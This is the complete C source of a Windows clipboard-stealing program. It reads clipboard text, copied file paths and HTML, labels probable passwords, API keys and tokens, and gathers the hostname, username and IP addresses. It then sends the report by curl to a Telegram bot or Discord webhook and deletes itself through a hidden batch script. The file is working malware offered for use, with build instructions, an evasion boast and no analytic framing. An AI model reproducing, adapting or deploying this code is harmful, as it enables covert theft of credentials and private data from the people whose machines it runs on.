/*
 * clip_grab.c — Clipboard content extractor + classifier
 *
 * HOW IT WORKS:
 * 1. Opens the Windows clipboard via native API
 * 2. Reads text (ANSI + Unicode), file lists (CF_HDROP), detects images
 * 3. Classifies text content (password, URL, API key, etc.)
 * 4. Collects machine info (hostname, user, public/private IP)
 * 5. Sends results to Telegram/Discord
 *
 * Uses native Windows APIs:
 * - user32.lib for clipboard access
 * - shell32.lib for DragQueryFile on CF_HDROP
 * - advapi32.lib for user info
 * - No PowerShell, no flagged commands
 *
 * Compile: python build.py clip --telegram --token X --chat Y
 *
 * Manual compile (MSVC):
 *   cl clip_grab.c /Fe:clip_grab.exe /DUSE_TELEGRAM /DTG_TOKEN="token" /DTG_CHAT="chat_id"
 *      user32.lib advapi32.lib shell32.lib
 *
 * Manual compile (GCC):
 *   gcc clip_grab.c -o clip_grab.exe -luser32 -ladvapi32 -lshell32
 */

#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

// ══════════════════════════════════════════════════
// EXFIL CONFIG — Set via compiler flags:
//   /DUSE_TELEGRAM /DTG_TOKEN="token" /DTG_CHAT="chat_id"
//   /DUSE_DISCORD /DDC_WEBHOOK="webhook_url"
// ══════════════════════════════════════════════════

#if !defined(USE_TELEGRAM) && !defined(USE_DISCORD)
#define USE_TELEGRAM
#endif

#ifndef TG_TOKEN
#define TG_TOKEN "YOUR_BOT_TOKEN"
#endif

#ifndef TG_CHAT
#define TG_CHAT "YOUR_CHAT_ID"
#endif

#ifndef DC_WEBHOOK
#define DC_WEBHOOK "YOUR_WEBHOOK_URL"
#endif

// ══════════════════════════════════════════════════
// Content classification
// ══════════════════════════════════════════════════

// Case-insensitive substring search
static int contains_ci(const char *haystack, const char *needle) {
    if (!haystack || !needle) return 0;
    size_t hlen = strlen(haystack);
    size_t nlen = strlen(needle);
    if (nlen > hlen) return 0;
    for (size_t i = 0; i <= hlen - nlen; i++) {
        int match = 1;
        for (size_t j = 0; j < nlen; j++) {
            if (tolower((unsigned char)haystack[i+j]) != tolower((unsigned char)needle[j])) {
                match = 0;
                break;
            }
        }
        if (match) return 1;
    }
    return 0;
}

// Check if text looks like a URL
static int looks_like_url(const char *text) {
    return (contains_ci(text, "http://") || contains_ci(text, "https://") ||
            contains_ci(text, "ftp://") || contains_ci(text, "www."));
}

// Check if text looks like a password
static int looks_like_password(const char *text) {
    if (strlen(text) < 6 || strlen(text) > 128) return 0;
    // Single line, no spaces (or few), mixed char types
    int has_upper = 0, has_lower = 0, has_digit = 0, has_special = 0;
    int spaces = 0, lines = 0;
    for (const char *p = text; *p; p++) {
        if (isupper((unsigned char)*p)) has_upper = 1;
        else if (islower((unsigned char)*p)) has_lower = 1;
        else if (isdigit((unsigned char)*p)) has_digit = 1;
        else if (*p == ' ') spaces++;
        else if (*p == '\n' || *p == '\r') lines++;
        else has_special = 1;
    }
    if (lines > 0) return 0;  // Multi-line = not a password
    if (spaces > 2) return 0; // Too many spaces
    int complexity = has_upper + has_lower + has_digit + has_special;
    return (complexity >= 3);  // At least 3 character classes
}

// Check if text looks like an API key / token / secret
static int looks_like_api_key(const char *text) {
    if (contains_ci(text, "api_key") || contains_ci(text, "apikey") ||
        contains_ci(text, "api-key") || contains_ci(text, "secret") ||
        contains_ci(text, "token") || contains_ci(text, "bearer") ||
        contains_ci(text, "sk-") || contains_ci(text, "pk_") ||
        contains_ci(text, "sk_live") || contains_ci(text, "sk_test") ||
        contains_ci(text, "ghp_") || contains_ci(text, "gho_") ||
        contains_ci(text, "AKIA") || contains_ci(text, "aws_") ||
        contains_ci(text, "password") || contains_ci(text, "passwd")) {
        return 1;
    }
    // Long hex or base64-ish string on a single line
    size_t len = strlen(text);
    if (len >= 20 && len <= 256 && !strchr(text, '\n') && !strchr(text, ' ')) {
        int hex_chars = 0;
        for (const char *p = text; *p; p++) {
            if (isxdigit((unsigned char)*p) || *p == '-' || *p == '_') hex_chars++;
        }
        if (hex_chars > (int)(len * 0.8)) return 1;
    }
    return 0;
}

// Check if text looks like an email
static int looks_like_email(const char *text) {
    const char *at = strchr(text, '@');
    if (!at) return 0;
    const char *dot = strchr(at, '.');
    return (dot && dot > at + 1 && *(dot + 1) != '\0');
}

// Classify clipboard text content
static const char* classify_text(const char *text) {
    if (!text || strlen(text) == 0) return "empty";
    if (looks_like_api_key(text))   return "*** POSSIBLE API KEY/TOKEN/SECRET ***";
    if (looks_like_url(text))       return "URL";
    if (looks_like_password(text))  return "*** POSSIBLE PASSWORD ***";
    if (looks_like_email(text))     return "Email Address";
    if (strlen(text) > 500)         return "Large Text Block";
    return "Text";
}

// ══════════════════════════════════════════════════
// Machine info (cached)
// ══════════════════════════════════════════════════

static char g_caption[512] = {0};
static char g_hostname[256] = {0};
static char g_username[256] = {0};
static char g_pub_ip[64] = {0};
static char g_priv_ip[64] = {0};

void init_info() {
    if (g_caption[0] != 0) return;

    DWORD s1 = sizeof(g_hostname), s2 = sizeof(g_username);
    GetComputerNameA(g_hostname, &s1);
    GetUserNameA(g_username, &s2);

    // Public IP
    system("C:\\Windows\\System32\\curl.exe -s api.ipify.org > %temp%\\ip.txt 2>nul");
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    char ipf[MAX_PATH];
    snprintf(ipf, MAX_PATH, "%sip.txt", tmp);
    FILE *f = fopen(ipf, "r");
    if (f) { fgets(g_pub_ip, sizeof(g_pub_ip), f); fclose(f); DeleteFileA(ipf); }
    char *nl = strchr(g_pub_ip, '\n'); if (nl) *nl = 0;
    nl = strchr(g_pub_ip, '\r'); if (nl) *nl = 0;

    // Private IP
    char pf[MAX_PATH];
    snprintf(pf, MAX_PATH, "%spriv.txt", tmp);
    system("ipconfig | findstr /i \"IPv4\" > %temp%\\priv.txt 2>nul");
    f = fopen(pf, "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            char *colon = strchr(line, ':');
            if (colon) {
                colon++;
                while (*colon == ' ') colon++;
                nl = strchr(colon, '\r'); if (nl) *nl = 0;
                nl = strchr(colon, '\n'); if (nl) *nl = 0;
                strncpy(g_priv_ip, colon, sizeof(g_priv_ip) - 1);
                break;
            }
        }
        fclose(f);
        DeleteFileA(pf);
    }

    snprintf(g_caption, sizeof(g_caption),
        "ClipGrab_%s@%s [pub:%s priv:%s]", g_username, g_hostname, g_pub_ip, g_priv_ip);
}

// ══════════════════════════════════════════════════
// Exfil — send text message or file
// ══════════════════════════════════════════════════

void send_file(const char *filepath) {
    init_info();
    char cmd[2048];
#ifdef USE_TELEGRAM
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"chat_id=" TG_CHAT "\" "
        "-F \"document=@%s\" "
        "-F \"caption=%s\" "
        "\"https://api.telegram.org/bot" TG_TOKEN "/sendDocument\" >nul 2>nul",
        filepath, g_caption);
#endif
#ifdef USE_DISCORD
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-F \"file=@%s\" "
        "-F \"payload_json={\\\"content\\\":\\\"%s\\\"}\" "
        "\"" DC_WEBHOOK "\" >nul 2>nul",
        filepath, g_caption);
#endif
    system(cmd);
}

void send_text_message(const char *text) {
    init_info();
    char cmd[4096];
#ifdef USE_TELEGRAM
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-d \"chat_id=" TG_CHAT "\" "
        "-d \"text=%s\" "
        "-d \"parse_mode=HTML\" "
        "\"https://api.telegram.org/bot" TG_TOKEN "/sendMessage\" >nul 2>nul",
        text);
#endif
#ifdef USE_DISCORD
    snprintf(cmd, sizeof(cmd),
        "C:\\Windows\\System32\\curl.exe -s "
        "-H \"Content-Type: application/json\" "
        "-d \"{\\\"content\\\":\\\"%s\\\"}\" "
        "\"" DC_WEBHOOK "\" >nul 2>nul",
        text);
#endif
    system(cmd);
}

// ══════════════════════════════════════════════════
// Clipboard grabber
// ══════════════════════════════════════════════════

void grab_clipboard(const char *outpath) {
    FILE *fp = fopen(outpath, "w");
    if (!fp) return;

    init_info();

    fprintf(fp, "=== Clipboard Grab ===\n");
    fprintf(fp, "Computer: %s\n", g_hostname);
    fprintf(fp, "User:     %s\n", g_username);
    fprintf(fp, "Pub IP:   %s\n", g_pub_ip);
    fprintf(fp, "Priv IP:  %s\n", g_priv_ip);
    fprintf(fp, "\n");

    if (!OpenClipboard(NULL)) {
        fprintf(fp, "Error: Could not open clipboard (error %lu)\n", GetLastError());
        fclose(fp);
        return;
    }

    // Enumerate all formats on clipboard for the report
    fprintf(fp, "--- Clipboard Formats Present ---\n");
    UINT fmt = 0;
    int fmt_count = 0;
    int has_text = 0, has_unicode = 0, has_hdrop = 0;
    int has_bitmap = 0, has_dib = 0, has_html = 0, has_rtf = 0;

    while ((fmt = EnumClipboardFormats(fmt)) != 0) {
        fmt_count++;
        char fmtName[256] = {0};
        if (fmt == CF_TEXT)            { has_text = 1; strcpy(fmtName, "CF_TEXT"); }
        else if (fmt == CF_UNICODETEXT){ has_unicode = 1; strcpy(fmtName, "CF_UNICODETEXT"); }
        else if (fmt == CF_HDROP)      { has_hdrop = 1; strcpy(fmtName, "CF_HDROP"); }
        else if (fmt == CF_BITMAP)     { has_bitmap = 1; strcpy(fmtName, "CF_BITMAP"); }
        else if (fmt == CF_DIB)        { has_dib = 1; strcpy(fmtName, "CF_DIB"); }
        else if (fmt == CF_DIBV5)      { has_dib = 1; strcpy(fmtName, "CF_DIBV5"); }
        else {
            // Custom format — get name
            int len = GetClipboardFormatNameA(fmt, fmtName, sizeof(fmtName));
            if (len == 0) snprintf(fmtName, sizeof(fmtName), "Format_%u", fmt);
            if (contains_ci(fmtName, "HTML")) has_html = 1;
            if (contains_ci(fmtName, "Rich Text") || contains_ci(fmtName, "RTF")) has_rtf = 1;
        }
        fprintf(fp, "  [%3u] %s\n", fmt, fmtName);
    }
    fprintf(fp, "  Total formats: %d\n\n", fmt_count);

    // Determine primary content type
    fprintf(fp, "--- Content Type ---\n");
    if (has_hdrop)         fprintf(fp, "  Primary: FILE LIST (copied files/folders)\n");
    else if (has_bitmap || has_dib) fprintf(fp, "  Primary: IMAGE (screenshot or copied image)\n");
    else if (has_html)     fprintf(fp, "  Primary: HTML (web content)\n");
    else if (has_rtf)      fprintf(fp, "  Primary: RICH TEXT\n");
    else if (has_unicode || has_text) fprintf(fp, "  Primary: PLAIN TEXT\n");
    else                   fprintf(fp, "  Primary: OTHER/UNKNOWN\n");
    fprintf(fp, "\n");

    // ── Extract CF_UNICODETEXT (preferred) ──
    if (has_unicode) {
        HANDLE hData = GetClipboardData(CF_UNICODETEXT);
        if (hData) {
            wchar_t *wtext = (wchar_t*)GlobalLock(hData);
            if (wtext) {
                // Convert to UTF-8 (or ANSI for simplicity)
                int needed = WideCharToMultiByte(CP_UTF8, 0, wtext, -1, NULL, 0, NULL, NULL);
                if (needed > 0) {
                    char *utf8 = (char*)malloc(needed + 1);
                    if (utf8) {
                        WideCharToMultiByte(CP_UTF8, 0, wtext, -1, utf8, needed, NULL, NULL);
                        utf8[needed] = 0;

                        const char *classification = classify_text(utf8);
                        fprintf(fp, "--- Unicode Text Content ---\n");
                        fprintf(fp, "  Classification: %s\n", classification);
                        fprintf(fp, "  Length: %d chars\n\n", (int)strlen(utf8));

                        // Truncate display if huge
                        if (strlen(utf8) > 4096) {
                            fprintf(fp, "  [First 4096 chars shown]\n");
                            utf8[4096] = 0;
                        }
                        fprintf(fp, "%s\n\n", utf8);
                        free(utf8);
                    }
                }
                GlobalUnlock(hData);
            }
        }
    }
    // ── Fallback: CF_TEXT (ANSI) ──
    else if (has_text) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData) {
            char *text = (char*)GlobalLock(hData);
            if (text) {
                const char *classification = classify_text(text);
                fprintf(fp, "--- ANSI Text Content ---\n");
                fprintf(fp, "  Classification: %s\n", classification);
                fprintf(fp, "  Length: %d chars\n\n", (int)strlen(text));

                // Truncate if huge
                size_t len = strlen(text);
                if (len > 4096) {
                    fprintf(fp, "  [First 4096 chars shown]\n");
                    char saved = text[4096];
                    // Can't modify locked memory — just use fwrite
                    fwrite(text, 1, 4096, fp);
                    fprintf(fp, "\n\n");
                } else {
                    fprintf(fp, "%s\n\n", text);
                }
                GlobalUnlock(hData);
            }
        }
    }

    // ── Extract CF_HDROP (file paths) ──
    if (has_hdrop) {
        HANDLE hData = GetClipboardData(CF_HDROP);
        if (hData) {
            HDROP hDrop = (HDROP)GlobalLock(hData);
            if (hDrop) {
                UINT fileCount = DragQueryFileA(hDrop, 0xFFFFFFFF, NULL, 0);
                fprintf(fp, "--- Copied Files (%u) ---\n", fileCount);

                for (UINT i = 0; i < fileCount && i < 100; i++) {
                    char filePath[MAX_PATH];
                    DragQueryFileA(hDrop, i, filePath, MAX_PATH);

                    // Get file attributes
                    DWORD attrs = GetFileAttributesA(filePath);
                    const char *type = "FILE";
                    if (attrs != INVALID_FILE_ATTRIBUTES) {
                        if (attrs & FILE_ATTRIBUTE_DIRECTORY) type = "DIR";
                    }

                    // Get file size if it's a file
                    if (strcmp(type, "FILE") == 0) {
                        WIN32_FILE_ATTRIBUTE_DATA fad;
                        if (GetFileAttributesExA(filePath, GetFileExInfoStandard, &fad)) {
                            ULARGE_INTEGER size;
                            size.HighPart = fad.nFileSizeHigh;
                            size.LowPart = fad.nFileSizeLow;
                            fprintf(fp, "  [%s] %s  (%llu bytes)\n", type, filePath, size.QuadPart);
                        } else {
                            fprintf(fp, "  [%s] %s\n", type, filePath);
                        }
                    } else {
                        fprintf(fp, "  [%s] %s\n", type, filePath);
                    }
                }
                if (fileCount > 100) {
                    fprintf(fp, "  ... and %u more files\n", fileCount - 100);
                }
                fprintf(fp, "\n");
                GlobalUnlock(hData);
            }
        }
    }

    // ── Check for HTML format ──
    if (has_html) {
        UINT htmlFmt = RegisterClipboardFormatA("HTML Format");
        if (htmlFmt) {
            HANDLE hData = GetClipboardData(htmlFmt);
            if (hData) {
                char *html = (char*)GlobalLock(hData);
                if (html) {
                    size_t len = strlen(html);
                    fprintf(fp, "--- HTML Content ---\n");
                    fprintf(fp, "  Length: %d chars\n", (int)len);
                    if (len > 2048) {
                        fprintf(fp, "  [First 2048 chars shown]\n");
                        fwrite(html, 1, 2048, fp);
                        fprintf(fp, "\n");
                    } else {
                        fprintf(fp, "%s\n", html);
                    }
                    fprintf(fp, "\n");
                    GlobalUnlock(hData);
                }
            }
        }
    }

    // ── Image detection (report only — can't easily exfil bitmap data as text) ──
    if (has_bitmap || has_dib) {
        fprintf(fp, "--- Image Detected ---\n");
        // Try to get bitmap dimensions from CF_DIB
        HANDLE hData = GetClipboardData(CF_DIB);
        if (hData) {
            BITMAPINFOHEADER *bih = (BITMAPINFOHEADER*)GlobalLock(hData);
            if (bih) {
                fprintf(fp, "  Dimensions: %ldx%ld\n", bih->biWidth, bih->biHeight);
                fprintf(fp, "  Bit depth:  %d bpp\n", bih->biBitCount);
                fprintf(fp, "  Size:       ~%lu bytes\n", (unsigned long)bih->biSizeImage);
                fprintf(fp, "  Note: Image data not exfiltrated (text-only mode)\n");
                GlobalUnlock(hData);
            }
        } else {
            fprintf(fp, "  Bitmap present but could not read dimensions\n");
        }
        fprintf(fp, "\n");
    }

    // ── Clipboard history (Windows 10 1809+ with clipboard history enabled) ──
    // The clipboard history API is a UWP/WinRT API (Windows.ApplicationModel.DataTransfer)
    // and is not easily accessible from plain C. We note this limitation.
    fprintf(fp, "--- Clipboard History ---\n");
    fprintf(fp, "  Note: Clipboard history API requires WinRT (UWP). Only current\n");
    fprintf(fp, "  clipboard contents captured. Enable via Settings > System > Clipboard\n");
    fprintf(fp, "  to make history available to WinRT-based tools.\n\n");

    // ── If clipboard is empty ──
    if (fmt_count == 0) {
        fprintf(fp, "  Clipboard is EMPTY — no data present.\n\n");
    }

    CloseClipboard();
    fclose(fp);
}

// ══════════════════════════════════════════════════
// Self-delete
// ══════════════════════════════════════════════════

void self_delete() {
    char self[MAX_PATH];
    GetModuleFileNameA(NULL, self, MAX_PATH);

    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);

    char bat[MAX_PATH];
    snprintf(bat, MAX_PATH, "%s_cg_del.bat", tmp);

    FILE *f = fopen(bat, "w");
    if (f) {
        fprintf(f, "@echo off\n");
        fprintf(f, ":retry\n");
        fprintf(f, "del /f \"%s\" >nul 2>nul\n", self);
        fprintf(f, "if exist \"%s\" (ping -n 1 127.0.0.1 >nul & goto retry)\n", self);
        fprintf(f, "del /f \"%s\" >nul 2>nul\n", bat);
        fclose(f);

        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        char cmd[MAX_PATH + 16];
        snprintf(cmd, sizeof(cmd), "cmd.exe /c \"%s\"", bat);
        CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// ══════════════════════════════════════════════════
// Main
// ══════════════════════════════════════════════════

int main() {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);

    char outFile[MAX_PATH];
    snprintf(outFile, MAX_PATH, "%scg.txt", tempPath);

    // Grab clipboard contents
    grab_clipboard(outFile);

    // Check file size to decide: sendMessage (small) vs sendDocument (large)
    WIN32_FILE_ATTRIBUTE_DATA fad;
    ULONGLONG fileSize = 0;
    if (GetFileAttributesExA(outFile, GetFileExInfoStandard, &fad)) {
        ULARGE_INTEGER sz;
        sz.HighPart = fad.nFileSizeHigh;
        sz.LowPart = fad.nFileSizeLow;
        fileSize = sz.QuadPart;
    }

    if (fileSize > 0) {
        // Always send as file — more reliable for formatting
        send_file(outFile);
    }

    // Clean up temp file
    DeleteFileA(outFile);

    // Self-delete the executable
    self_delete();

    return 0;
}
